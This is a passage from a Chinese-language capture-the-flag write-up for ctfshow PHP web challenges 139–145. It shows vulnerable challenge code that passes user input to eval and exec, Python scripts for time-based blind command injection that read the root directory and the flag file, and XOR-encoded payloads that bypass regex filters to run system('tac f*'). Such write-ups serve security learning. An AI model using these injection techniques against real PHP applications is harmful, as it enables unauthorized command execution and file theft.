variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看似没什么变化但其实写文件权限被限制了，然后我们可以使用盲试。这里使用羽师傅的脚本（羽师傅yyds）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token builtin">str</span><span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits          <span class="token comment"># 字母加数字，学到了</span>result<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>key<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token keyword">break</span><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>            <span class="token comment"># awk 与 NR表示从awk开始执行后，按照记录分隔符读取的数据次数，默认的记录分隔符为换行符，表明读了几个文件</span>            <span class="token comment"># cut -c表明第几个字符</span>            <span class="token comment"># 表明判断的结束</span>payload<span class="token operator">=</span><span class="token string">"if [ `ls /|awk 'NR==&#123;0&#125;'|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token comment">#print(payload)</span>url<span class="token operator">=</span><span class="token string">"http://d263f9ef-d7ee-444b-989d-ed41ee55477c.challenge.ctf.show/?c="</span><span class="token operator">+</span>payload<span class="token keyword">try</span><span class="token punctuation">:</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    result<span class="token operator">=</span>result<span class="token operator">+</span>n    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">break</span><span class="token keyword">if</span> n<span class="token operator">==</span><span class="token string">'9'</span><span class="token punctuation">:</span>key<span class="token operator">=</span><span class="token number">1</span>result<span class="token operator">+=</span><span class="token string">" "</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag所在文件 f149_15_h3r3，接着盲注文件内容</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token builtin">str</span><span class="token operator">=</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span><span class="token string">"-"</span>result<span class="token operator">=</span><span class="token string">""</span>key<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token keyword">if</span> key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token keyword">break</span><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>payload<span class="token operator">=</span><span class="token string">"if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token comment">#print(payload)</span>url<span class="token operator">=</span><span class="token string">"http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c="</span><span class="token operator">+</span>payload<span class="token keyword">try</span><span class="token punctuation">:</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    result<span class="token operator">=</span>result<span class="token operator">+</span>n    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$f1</span></span>(<span class="token interpolation"><span class="token variable">$f2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>松散对比</p><p><img src="song.png"></p><p>可以看到只要使intval结果为0即可。</p><p>intval会将非数字字符转换为0，也就是说 intval(‘a’)==0 intval(‘.’)==0 intval(‘/‘)==0</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">current</span><span class="token punctuation">(</span>localeconv<span class="token punctuation">)</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     因为<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html md5后开头的数字所以我们改用sha1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首席爱你我们应该知道这个正则表达式的含义，即匹配所有不是字母数字和_的字符。</p><p>绕过正则表达式很简单，无字母shell即可。关键是return 如何绕过。</p><p>首先，我们应该知道</p><pre class="line-numbers language-none"><code class="language-none">eval(&quot;return 1;phpinfo();&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>是没有办法的执行的。但是php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的。</p><p>所以我们可以构造1-phpinfo-1的形式。</p><p>接下来就是payload了，首先我们先用脚本构造system(‘tac f*’)</p><p>貌似cat没法使用，可能被后台禁用了。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?v1&#x3D;1&amp;v3&#x3D;-(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%01%03%00%06%00&quot;^&quot;%7c%60%60%20%60%2a&quot;)-&amp;v2&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">*</span><span class="token operator">/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$v1</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>…输入0？完事。。</p><h2 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里过滤加加减和否，所以异或即可，运算乘。</p><pre class="line-numbers language-none"><code class="language-none">payload:v1&#x3D;1&amp;v3&#x3D;*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%00&quot;^&quot;%7f%60%60%20%60%2a&quot;)*&amp;v2&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">1</span><span class="token operator">?</span><span class="token constant boolean">true</span><span class="token punctuation">:</span><span class="token constant boolean">false</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没啥好说的吧</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%0c%06%0c%0b%05%0d"</span><span class="token operator">^</span><span class="token string double-quoted-string">"%7f%7f%7f%7f%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%0b%01%03%00%06%00"</span><span class="token operator">^</span><span class="token string double-quoted-string">"%7f%60%60%20%60%2a"</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token operator">=</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\>|\*|\/|\^|\#|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token 